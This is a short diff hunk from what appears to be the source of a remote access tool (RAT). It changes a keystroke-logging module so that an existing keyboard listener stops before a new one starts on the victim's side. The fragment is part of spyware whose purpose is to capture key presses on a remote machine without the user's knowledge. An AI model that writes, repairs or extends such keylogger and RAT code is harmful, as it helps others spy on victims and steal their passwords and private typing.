@@ -33,6 +33,8 @@ class MyLogging(RATFunction):
     def handle_packet_remote_side(self, data):
         packet_id, enabled, _ = self.set_state_packet_struct.unpack(data)
         if enabled:
+            if self.keyboard_listener:
+                self.keyboard_listener.stop()
             self.keyboard_listener = keyboard.Listener(on_press=self._on_press)
             self.keyboard_listener.start()
         else:
